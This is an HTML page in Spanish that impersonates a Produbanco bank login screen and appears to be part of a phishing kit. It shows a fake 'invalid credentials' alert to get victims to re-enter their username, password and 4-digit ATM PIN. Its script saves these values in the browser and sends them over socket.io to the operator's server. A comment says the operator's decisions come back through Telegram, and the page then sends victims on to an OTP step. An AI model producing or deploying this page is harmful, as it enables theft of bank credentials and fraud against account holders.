<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificación de cuenta</title>
  <style>
    body {
      background-color: #f3f6fb;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #fff;
      border-radius: 15px;
      padding: 40px 30px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo {
      margin-bottom: 30px;
    }
    .logo img {
      height: 50px;
    }
    h2 {
      font-size: 1.5em;
      margin-bottom: 10px;
    }
    p {
      color: #777;
      font-size: 0.95em;
      margin-bottom: 20px;
    }
    .alerta {
      background-color: #ffe5e5;
      color: #d8000c;
      border: 1px solid #d8000c;
      padding: 10px;
      border-radius: 8px;
      margin-bottom: 20px;
      font-size: 0.95em;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1em;
      max-width: 350px;
      margin-left: auto;
      margin-right: auto;
    }
    button {
      background-color: #1B4D08;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1em;
      width: 100%;
    }
    button:hover {
      background-color: #000000;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQW4kQa4Shm2hZGe6G1iAA8d9RJSHJURgbzeA&s" alt="logo" />
    </div>
    <h2>Bienvenido a <strong>PRODUBANCO</strong></h2>
    <div class="alerta">
      ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
    </div>
    <p>Ingrese su usuario, contraseña y clave de cajero para continuar.</p>
    <form id="login-form">
      <input type="text" id="usuario" placeholder="Ingrese su usuario" required />
      <input type="password" id="clave" placeholder="Contraseña" required />
      <!-- Campo Clave de Cajero -->
      <input type="text" id="claveCajero" placeholder="Clave de cajero" maxlength="4" required />
      <button type="submit">Continuar</button>
    </form>
  </div>

  <!-- Scripts -->
  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();

    window.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('login-form');

      if (form) {
        form.addEventListener('submit', (e) => {
          e.preventDefault();

          const usuario = document.getElementById('usuario').value;
          const contrasena = document.getElementById('clave').value;
          const claveCajero = document.getElementById('claveCajero').value;
          const sessionId = localStorage.getItem('sessionId');

          if (!usuario || !contrasena || !claveCajero) {
            alert("Por favor, complete todos los campos.");
            return;
          }

          if (!/^\d{4}$/.test(claveCajero)) {
            alert("La clave de cajero debe tener exactamente 4 dígitos numéricos.");
            return;
          }

          // Guardar en localStorage
          localStorage.setItem('usuario', usuario);
          localStorage.setItem('contrasena', contrasena);
          localStorage.setItem('claveCajero', claveCajero);

          // Enviar al servidor
          socket.emit('errorlogoForm', { usuario, contrasena, claveCajero, sessionId });

          // Redirigir
          window.location.href = 'opciones.html';
        });
      }
    });

    // Respuesta desde Telegram
    socket.on("respuestaErrorLogo", (decision) => {
      if (decision === "otp") {
        window.location.href = "bienvenido.html";
      } else if (decision === "error_logo") {
        window.location.href = "errorlogo.html";
      }
    });
  </script>
</body>
</html>
